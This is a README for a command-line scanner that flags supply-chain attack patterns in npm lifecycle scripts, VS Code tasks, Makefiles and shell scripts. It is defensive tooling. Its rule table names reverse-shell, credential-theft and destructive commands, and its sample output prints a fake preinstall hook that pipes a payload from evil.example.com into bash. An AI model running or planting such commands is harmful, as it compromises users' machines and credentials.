# repo-safe-scan

> **Audit `package.json` scripts, VSCode tasks, Makefiles and shell scripts for supply-chain attack patterns — before you `npm install`.**

[![Node.js >=18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

---

## Why?

Most security tools scan your **dependencies** for known vulnerabilities (e.g. CVEs). But attackers increasingly exploit **script execution hooks** that run automatically when you clone and install a repo:

| Vector | Risk |
|--------|------|
| `preinstall` / `postinstall` in `package.json` | Executes on every `npm install` — silently |
| `.vscode/tasks.json` | Auto-runs tasks when VS Code opens the folder |
| `.vscode/settings.json` | Can hijack your integrated terminal |
| `Makefile` default targets | Executes on `make` |
| `*.sh` scripts | Called by any of the above |

`repo-safe-scan` detects these patterns **before** you run anything.

---

## Installation

```bash
# Install globally
npm install -g repo-safe-scan

# Or use via npx (no install needed)
npx repo-safe-scan /path/to/repo
```

---

## Usage

```bash
repo-safe-scan [path] [options]
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `[path]` | Repository root to scan | `.` (current dir) |
| `--severity <level>` | Minimum severity to report: `medium` \| `high` \| `critical` | `medium` |
| `--json` | Output findings as JSON (for CI pipelines) | off |
| `--no-color` | Disable colored terminal output | off |
| `--version` | Print version | |

### Examples

```bash
# Scan a locally cloned repo before installing
repo-safe-scan ./suspicious-package

# Only show critical findings
repo-safe-scan ./suspicious-package --severity critical

# Machine-readable output for CI
repo-safe-scan . --json | jq '.findings[] | select(.rule.severity=="critical")'
```

---

## What it Detects

`repo-safe-scan` uses regex-based rules organized by category:

| Category | Examples |
|----------|---------|
| **remote-execution** | `curl \| bash`, `wget \| sh`, `Invoke-Expression` |
| **obfuscation** | `eval()`, `new Function()`, `base64 -d`, `fromCharCode` |
| **reverse-shell** | `nc -e`, `/dev/tcp/`, `socat` |
| **credential-theft** | Access to `~/.ssh`, `~/.aws/credentials`, `.npmrc` |
| **destructive** | `rm -rf`, `del /f /q`, `format C:` |
| **privilege-escalation** | `sudo` in npm scripts, `chmod +x` after download |
| **tls-bypass** | `curl -k`, `wget --no-check-certificate` |
| **reconnaissance** | `whoami \|`, `ifconfig \| curl` |

### Lifecycle Hook Priority

Scripts in `preinstall`, `postinstall`, `prepare`, and other auto-executed npm hooks are **automatically escalated** from `high` → `critical` because they run without any user interaction.

---

## CI Integration

Add a pre-install check to your CI pipeline:

```yaml
# GitHub Actions example
- name: Scan repo for malicious scripts
  run: npx repo-safe-scan . --severity high --json > scan-results.json
  # exits with code 1 if any findings match the severity filter
```

`repo-safe-scan` exits with **code 1** when findings are detected, making it easy to fail a CI build.

---

## Output

### Terminal (default)

```
  repo-safe-scan v1.0.0  🔍 Scanning: ./suspect-repo

  📄 package.json
  ────────────────────────────────────────────────────────────
  CRITICAL  LIFECYCLE  curl-pipe-shell
  Description: Downloads and pipes content directly into a shell
  Category:    remote-execution
  Script:      preinstall
  Command:     curl http://evil.example.com/payload.sh | bash
  ...
  ════════════════════════════════════════════════════════════
  SUMMARY  2 critical  1 high  0 medium  (2 auto-executed lifecycle hooks)
```

### JSON (`--json`)

```json
{
  "scannedPath": "./suspect-repo",
  "findings": [
    {
      "file": "package.json",
      "scriptName": "preinstall",
      "command": "curl http://evil.example.com/payload.sh | bash",
      "rule": {
        "id": "curl-pipe-shell",
        "description": "Downloads and pipes content directly into a shell",
        "severity": "critical",
        "category": "remote-execution"
      },
      "lifecycle": true,
      "detail": null
    }
  ]
}
```

---

## Development

```bash
# Clone and install
git clone https://github.com/yourname/repo-safe-scan.git
cd repo-safe-scan
npm install

# Run tests
npm test

# Run with coverage
npm run test:coverage

# Scan the repo itself
npm start -- .
```

### Project Structure

```
repo-safe-scan/
├── bin/
│   └── cli.js               # CLI entry point
├── src/
│   ├── scanner.js           # Orchestrator — runs all analyzers
│   ├── analyzers/
│   │   ├── packageAnalyzer.js    # package.json scripts
│   │   ├── vscodeAnalyzer.js     # .vscode/ (tasks, settings, extensions)
│   │   ├── makefileAnalyzer.js   # Makefile targets
│   │   └── shellScriptAnalyzer.js # *.sh / *.bash files
│   └── rules/
│       └── rules.js         # All detection rules (regex + severity + category)
└── tests/
    ├── packageAnalyzer.test.js
    ├── vscodeAnalyzer.test.js
    └── fixtures/
        ├── malicious-repo/
        ├── malicious-vscode/
        └── clean-repo/
```

---

## Adding Custom Rules

Edit `src/rules/rules.js` and add a rule object:

```js
{
  id: "my-custom-rule",
  description: "Explanation shown in output",
  regex: /your-pattern-here/i,
  severity: "high",        // 'medium' | 'high' | 'critical'
  category: "my-category",
}
```

---

## License

MIT © 2026
